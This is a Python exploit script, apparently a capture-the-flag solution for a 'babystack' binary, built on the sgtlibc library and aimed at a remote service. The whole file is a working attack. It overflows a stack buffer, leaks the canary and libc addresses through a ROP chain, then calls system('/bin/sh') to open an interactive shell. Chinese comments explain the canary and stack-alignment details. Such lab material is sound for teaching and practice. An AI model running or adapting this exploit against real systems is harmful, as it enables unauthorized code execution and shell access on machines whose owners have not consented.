import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=False,
    file='./babystack',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf
main_addr = 0x00400908  # elf.symbols['main']


canary = b''


def exp():
    # overflow position
    data = [b'a' * (136), canary, (b'' if not canary else fakeebp())]
    return data


sla(b'>> ', '1')
se(exp() + b'b')

sla(b'>> ', '2')
ru(exp() + b'b')
# 此处是先获取canary，注意canary64位时候是 00开头的，需要将该00补上，否则将被截断无法回显
canary = rc(7).rjust(8, b'\0')
log.info(f'canary:{canary.hex()}')


main_addr = 0x000000400908  # elf.symbols['main']
csu_init_addr = 0x00400A30  # elf.symbols['__libc_csu_init']


def leak(func: str):
    log.warning(f'start leak {func}')
    payload = exp()
    payload += [elf.rop['rdi'], elf.got[func],   elf.plt['puts']]
    payload += [[elf.rop['ret']] * 1]  # 栈平衡
    payload += [main_addr]
    # sla(b' input\n',payload)
    sl(payload)
    # ru('joke')
    # ru(fakeebp())  # 如果有输出则清空缓存

    data = rc(6).ljust(8, b'\0')
    data = u00(data)
    log.info(f'leak {func}:{hex(data)}')
    s.add_condition(func, data)
    return data


# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
# leak('printf')
leak('puts')
# leak('stdout')
# leak('stdin')
leak('__libc_start_main')
# libc = ELF('libc_buu-2.23_x64.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset

data = s.dump(db_index=2)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')


payload = exp()
payload += [elf.rop['rdi'], binsh_addr]
payload += [system_addr]
sl(payload)
interactive()
